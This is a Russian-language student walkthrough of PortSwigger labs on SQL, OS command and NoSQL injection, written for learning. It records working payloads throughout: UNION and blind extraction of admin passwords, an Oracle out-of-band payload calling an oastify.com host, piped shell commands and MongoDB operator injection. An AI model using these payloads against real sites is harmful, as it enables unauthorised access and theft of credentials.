# SQLi
## Теория
Есть лекция, семинар, https://portswigger.net/web-security/sql-injection/cheat-sheet
## Apprentice
### [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
Из описания увидели запрос
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Увидели, что в url прокидывается категория, так что простой `category=a' OR released=0--`показывает нам все скрытые элементы (потому что запрос превращается в `SELECT * FROM products WHERE category = 'a' OR released=0--`)

### [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
Максимально просто прокидываем в форму логин `administrator'--`

## Practitioner
### [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
Для начала отправляем запрос в repeater в бурпе.

Ищем куда можно прокидывать вход - находим в url category = X, предполагаем, что это перекинется в запрос вроде `SELECT ... FROM X`. Получается, здесь мы можем выбирать таблицу, но не можем менять, что из нее выбирается, так что получить нужную инфу напрямую не выйдет.

Попробуем написать что-то вроде `SELECT ... FROM X UNION SELECT ... FROM Y`. Y явно будет v$version, поскольку мы хотим получить версию Oracle, в реальности бы пришлось ещё поперебирать. Тогда во второе ... мы хотим закинуть banner, но чисто его мы прокинуть не можем, потому что кол-во столбцов должно совпадать с кол-вом столбцов в изначальной части запроса.

Посмотрим, сколько там столбцов, перебирая количество NULL (пока сервер не перестанет возвращать 200): `' UNION SELECT NULL,NULL FROM dual--`, dual - как раз таблица в Oracle, из которой можно доставать нужные столбцы. 

Подобрали кол-во null-ов, начинаем заменять их строками (можно просто 'a'). Нашли, что в первую и вторую можно прокинуть строку, так что заменяем всё на нужный финальный запрос: `' UNION SELECT banner,'ABC' FROM v$version--`

### [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
По сравнению с предыдущей лабой изменился сервер. В отличие от oracle, после select не обязательно писать from, так что можно просто писать `' UNION SELECT NULL,NULL--`. Это возвращало ошибку, потому что в mysql после -- обязательно идет пробел, так что писать надо `--+` из-за url encoding.

Финальный запрос выглядит так: `category=Gifts' UNION SELECT @@version,'abc'--+`

### [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
Нащупали две текстовые колонки

Через сначала @@version -> 500 и затем version() -> 200 поняли, что работаем с постгресом.

Теперь надо понять название таблицы с пользователями. Командой `category=Pets' UNION SELECT table_name, 'abc' from information_schema.tables--` и затем поиском по результату находим таблицу `users_brsokc`. Название таблицы information_schema.tables узнали из [cheetsheet-a](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Теперь надо найти имена колонок с логином и паролем. Командой `category=Pets' UNION SELECT column_name, 'abc' from information_schema.columns where table_name='users_brsokc'--` находим `username_mgmxdo` и `password_axygtx`.

Собираем это в один конструктор: 
`category=Pets' UNION SELECT username_mgmxdo, password_axygtx from users_brsokc--`

Реально сработало! Получаем логин `administrator` и пароль `9g9luol1ek9og46n91yl`. 

### [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
Судя по описанию, клон предыдущей лабы, но на оракле. Погнали.

| Команда                                                                              | Что получили                         |
| ------------------------------------------------------------------------------------ | ------------------------------------ |
| UNION SELECT table_name,NULL FROM all_tables--                                       | USERS_BNCBVU                         |
| UNION SELECT column_name,NULL FROM all_tab_columns where table_name='USERS_BNCBVU'-- | USERNAME_ITNCAU : PASSWORD_ERTPVT    |
| UNION SELECT USERNAME_ITNCAU,PASSWORD_ERTPVT FROM USERS_BNCBVU--                     | administrator : 7m65kih2xnhq8wooas4f |
Это было очень весело, мне нравится.

### [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
Че-то я не в том порядке пошел, я этим активно пользовался до этого. Ну ладно, простым `category=Pets' UNION SELECT NULL,NULL,NULL-- `

### [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
`UNION SELECT NULL,'dVbRpo',NULL--`

### [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
`UNION SELECT password,'tag' from users where username='administrator'--`

### [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
Вообще, это можно было сделать без склеивания, командой `UNION SELECT NULL,password from users WHERE username='administrator'--`. Но, во-первых, не так удобно искать пароль среди кучи строк вывода, и плюс мы так сливаем не всю БД, а только пароль админа.

Так что используем следующую команду: `UNION SELECT NULL,username||':'||password from users--`. Не забываем разделитель, здесь для красоты и следования стандарту, это `:`.

### [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
Понимаем, что SQLi в cookie TrackingId. Для меня это `TrackingId=KDsVKAQdujY9wZiO`

Попробуем прокинуть туда кавычку, наш любимый детектор sqli. 500 не ловим, но видим, что пропала надпись 'Welcome back'. Значит ли это, что оно проверяет на соответствие одной из записей в бд? Не узнаем, пока не попробуем прокинуть `TrackingId=KDsVKAQdujY9wZiO' and 1=1--`. И надпись действительно вернулась!!!!

Значит, наш sqli работает, погнали пытаться вытащить ~~мозг через нос~~ пароль через SQLi: пропишем команду `TrackingId=KDsVKAQdujY9wZiO' and (SELECT 'a' FROM users LIMIT 1)='a'--` и таким образом поймем, что существует таблица users. Затем добавим `where username='administrator` вместо лимита и поймем, что существует такой пользователь.

Пойдем проверять длину пароля: `TrackingId=KDsVKAQdujY9wZiO' and (SELECT 'a' FROM users where username='administrator' and LENGTH(password)>2)='a'--` возвращает истину. Бинарным поиском доходим прыгаем к 32 -> false; 16 -> true и в итоге находим длину 20.

Такое мы вручную не переберем, так что воспользуемся интрудером!! (ура, новый друг). Перекинем туда запрос через rightlick->send to intruder. Напишем `TrackingId=KDsVKAQdujY9wZiO' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--` и окружим `a` знаками параграфа. Затем в payloads добавим alphanumeric characters в соответствие с заданием (к сожалению, не из удобного списка, мне вышка не оплатила бурп). 

Затем в настройках атаки выберем Grep - match, выделим и уберем все варианты и добавим Welcome back.

Можем запускать! В первом видим, что успех получили при значении первого символа `3`. Но нам что, правда вручную 20 раз менять положение подстроки? Разумеется, не для такого мама гения растила, так что я пошел ~~смотреть Community solutions~~ медитировать в горах, пока я не узнал про cluster bomb.

Меняем тип атаки на него, и первую единичку в нашей substring тоже помечаем параграфом и ставим для перебора Numbers (даже не требует про версию, вау), начиная с 2 и заканчивая 20 (капец, я забыл, что нам так много нужно) .

Показать только версии с Welcome back нам не-pro версия не даст, но хотя бы можно отсортировать по убыванию этого столбца и сверху будут только значения с единичкой. Жестко ждем, пока ~~нас ratelimitнут~~ все 20 символов найдутся

Так же важно отметить, что это не самый умный и оптимальный способ - даже если мы нашли значение для конкретной позиции, бурп будет продолжать подставлять другие значения в неё.

Капец, получилось ооочень долго, больше часа, я ещё 5 раз забывал про это, у меня ресеталась лаба, менялся пароль и приходилось начинать заново. 

В теории можно было либо реализовать это кастомным скриптом на каком-нибудь питончике, и сверху ещё докрутить что-то вроде бинарного поиска по символам.
### [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
По ощущениям нас ждет настолько же "веселая" лабораторка, как предыдущая, если так, то я иду писать скрипт на питоне.

Добавляем `'` в конец trackingId, получаем 500. Здорово.

Я попробовал поюзать union select null from dual, но никакое количество не помогло, даже когда я добавил limit 1, так что тут явно требуется другой подход.

Птички из солюшена мне нашептали, что тут надо использовать синтаксис `TrackingId=xyz'||(SELECT '')||'`. Он тоже выдаёт ошибку, и так мы понимаем, что мы в оракле (о нет). В итоге запрос `TrackingId=dY0eycscxj0EDVnw'||(SELECT '' FROM dual)||'` действительно проходит.

Далее узнаем, что есть таблица users. При этом нам нужна одна строка, и я не понял, почему limit 1 в данном случае не работает (а `'||(SELECT '' FROM users where ROWNUM=1)||'` работает).

Через `TrackingId=dY0eycscxj0EDVnw'||(SELECT password FROM users where username='administrator')||'` понимаем, что названия столбцов стандартные.

`'||((SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual))||'` позволяет нам выдавать ошибку для корректных и успех для инкорректных (я так полагаю, используется именно такой маппинг, потому что куча 500-к выглядят в логах подозрительнее, чем куча 200-к).

Итак, поиск длины пароля происходит командой `'||(SELECT CASE WHEN LENGTH(password)>100 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'`. Специально для начала выбрал ложное условие, чтобы вернулось 200 и я знал, что запрос правильный.

Снова узнаем, что длина пароля - 20.

Ну что же, погнали писать скрипт.

Скриптик надо будет залить в гит, а пока впечатления: ОНО РАБОТАЕТ!! У МЕНЯ ПРОШЛУЮ ЗАДАЧУ БУРП ВЫПОЛНЯЛ ЧАС, ТУТ 3 МИНУТЫ ПИТОНУ ПОНАДОБИЛОСЬ КАК ЖЕ ЗДОРОВО.
![[Portswigger sqli osi nosqli-1760453517103.webp]]
### [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
В вывод показывается полная ошибка, причем если кусок запроса прошел, то уже покажется его результат. В итоге мы сначала достали что при лимите 1 из юзеров достаётся админ, затем мы таким образом через попытку кастануть в инт достаём пароль
`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
### [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
Можно перебрать разные СУБД.

`TrackingId=MCqjEUeSyiIiRaQg'||pg_sleep(10)--`
### [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
Похоже на модификацию той задачи, которую мы решали питоном, с добавлением предыдущей, поскольку код возвращается всегда одинаковый. Что же, в таком случае просто модифицируем наш код.
### [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
Нужен про бурп, пока мимо.
1. `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//xyz.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--`
### [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
Итак, SQLi находим в инвентаризации внизу страницы конкретного товара.

Видим POST-запрос, в нём:
``` xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Пробуем добавить `'` и видим 403 и задетекченную атаку!

Значит, надо обходить. Лично я не знаю кодировку, которая бы помогла нам закодировать этот символ, так что надо искать XML-specific способы кодирования.

Поискав, я нашел расширение из бурпа ~~(которое совпадает с предложенным в солюшене)~~ - Hackvertor. Используем @hex_entities, и дальше по старой схеме - Union select NULL-- выдаёт в ответе NULL!! Значит, можем по базе выдавать 1 UNION SELECT username||':'||password from users-- и получать тотальное господство над миром. SQLi на этом всё.
# OS Command Injection
## Apprentice
### [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
Просто пытаемся запайпить команду к существующим аргументам: `productId=1|whoami&storeId=1`
## Practitioner
### [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
В [гайде](https://portswigger.net/web-security/os-command-injection) видим, что delay можно вызвать командой ``& ping -c 10 127.0.0.1 &``

Смотрим на запрос сабмита фидбека: `csrf=8a0UOlubEw9VYtIBnJYofpSaqTA5ZybP&name=a&email=a%40a&subject=a&message=a`. Попробуем попайпить нашу команду в разные аргументы, пока не сработает. Получаем `csrf=8a0UOlubEw9VYtIBnJYofpSaqTA5ZybP&name=a&email=a%40a||ping -c 10 127.0.0.1||&subject=a&message=a`.
### [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
Итак, снова наша любимая форма сабмита.

Из описания знаем, что картинки хранятся в `/var/www/images/`. Значит прописываем команду `&email=a%40a||whoami > /var/www/images/flag.txt||&subject=...` 

Осталось получить флаг. Для этого тыкаем на картинку любого товара и нажимаем "открыть изображение в новой вкладке". Видим, что url кончается на `/image?filename=`. Прописываем туда flag.txt и готово!!

# NoSQL Injection
## Apprentice
### [Detecting NoSQL injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)
Ура, в nosql я вообще не смешарик, так что идем по райтапу и пытаемся впитывать инфу.

На удивление, детектим уязвимость мы тоже нашей любимой `'`. Это радует.

Сразу получаем полную ошибку, здорово. Там и про JavaScript сказано, и ещё и говорится, что это в mongohelpers.js.

Пытаемся прокинуть туда ещё `+`, получаем снова ошибку, потому что надо url-encode-нуть. Ошибки снова нет!

Теперь нам советуют прокинуть url-encode-нутое false выражение: `'&&0&&'x`. Насколько я понял, `'x` выполняет функцию коммента (--). Почему это не вызывает ошибку? Я верю в то, что JavaScript это vibes-based language, либо мы корректно предполагаем, что в конце строки у нас стоит закрывающая `'`.

В результате получаем валидные ответ без ошибок, но и без товаров. Успех! А если 0 заменить на 1, то получим нашу категорию.

А если прописать `category='||1||'`, то увидим все товары независимо от категории, в том числе не релизнутые. Лаба solved, это было прикольно.
### [Exploiting NoSQL operator injection to bypass authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
Попробуем для логина использовать `{"username":"administrator","password":{"$ne":""}}`. Не получается.

Тогда попробуем `"username":{"$regex":"admin.*"},"password":{"$ne":""}`. И о чудо! Нас логинит. Проблема была в том, что username в данном случае `adminujtd7k6k`. Но прикольно! Подружились с операторами MongoDB, ура новые друзья.
### [Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)
О нет. Мы снова будем 20-символьный пароль по одному символу доставать??

Итак, поехали. Логинимся, затем заходим в Proxy->HTTP history, там видим /user/lookup?user=wiener. Отправим-ка это в репитер и сменим юзера на админа. И нам даже выдает его имя, мэйл и роль!!

При этом если напишем несуществующего юзера, то получим  "Could not find user", а если добавим `'`, то получаем "There was an error getting user details". Здорово.

Если добавим `&& '1'=='1` (закодированное в URL), то запись выдаётся, если ложное условие, то нет.

Через `user=administrator'+%26%26+this.password.length < 30+||'a'%3d%3d'b` находим длину пароля. На удивление, на этот раз это 8, а не 20. Как же так, а ведь очень хотелось перебрать снова 20 символов.

Раз уж размер такой маленький, питона расчехлять не будем и обойдемся интрудером.

![[Portswigger sqli osi nosqli-1760733764526.webp]]

Полученный пароль - `tcfvrrhy`
### [Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)
Пытаемся залогиниться с паролем pass - получаем invalid username or password.

Используем `"password":{"$ne":""}` и получаем что-то вроде успеха! Правда аккаунт залочен и нужно ресетнуть пароль (или это не успех, а мы локнули аккаунт своими действиями.... Но если так, то очень просто будет устроить массовый DoS).

Добавим `"$where": "0"` к запросу и увидим снова сообщение о невалидных данных; при этом `"$where": "1"` проходит отлично. Значит, всякие дополнительные операторы прекрасно парсятся и исполняются.

Скриптиком на питончике достаём поля json-a: username, password, forgotPwd!! Вот основная строка:

```
data = f'{{"username":"carlos","password":{{"$ne":""}},"$where": "Object.keys(this)[{field_num}].match(\'^.{{{position}}}{candidate}.*\')"}}'
```
``` python
data = f'{{"username":"carlos","password":{{"$ne":""}},"$where": "Object.keys(this)[{field_num}].match(\'^.{{{position}}}{candidate}.*\')"}}'
```

Вот последний нам и нужен. Переберем теперь его, следующей упрощенной по сравнению с предыдущей строкой:

```
data = f'{{"username":"carlos","password":{{"$ne":""}},"$where": "this.{field_name}.match(\'^.{{{position}}}{candidate}.*\')"}}'
```

Получившийся токен: `484e4f19958683cc`